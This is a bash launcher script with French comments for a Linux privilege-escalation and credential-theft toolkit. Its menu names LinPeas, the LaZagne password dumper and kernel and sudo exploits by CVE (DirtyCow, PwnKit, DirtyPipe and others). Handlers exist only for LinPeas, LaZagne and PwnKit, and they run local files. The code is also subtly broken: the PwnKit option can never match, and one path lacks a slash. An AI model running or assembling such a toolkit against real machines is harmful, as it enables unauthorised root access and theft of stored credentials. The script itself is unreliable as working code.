#!/bin/bash

arch="64 32"

if [[ "$*" == "-help" ]]; then
    echo "cmd:"
    echo "   -LinPeas       Execute LinPeas"
    echo "   -LaZagne       Execute LaZagne"
    echo "   -Overlays      Overlays64 - CVE-2015-1328"
    echo "   -DirtyCow      DirtyCow - CVE-2016-5195"
    echo "   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034"
    echo "   -DirtyPipe     DirtyPipe - CVE-2022-0847"
    echo "   -Chroot        Sudo Chroot - CVE-2025-32463"
    echo "   -SudoHost      Sudo Hostname - CVE-2025-32462 "
    echo "   -check         Verifie si gcc & python est installer"
    echo "   -perm          Applique les droit d'execution"
    exit 0
fi

# Application des droit d'execution
if [[ "$*" == "-perm" ]]; then
   find ${PWD} -type f -exec chmod +x {} \;
fi

# LinPeas
if [[ "$*" == "-LinPeas" ]]; then
   "${PWD}linpeas/linpeas.sh"
fi

# LaZagne
if [[ "$*" == "-LaZagne" ]]; then
  "${PWD}/LaZagne/Linux/laZagne.py"
fi

# PwnKit
if [[ "$*" == "-PwnKit${arch}" ]]; then
   "${PWD}exploits/PwnKit/PwnKit${arch}"
fi
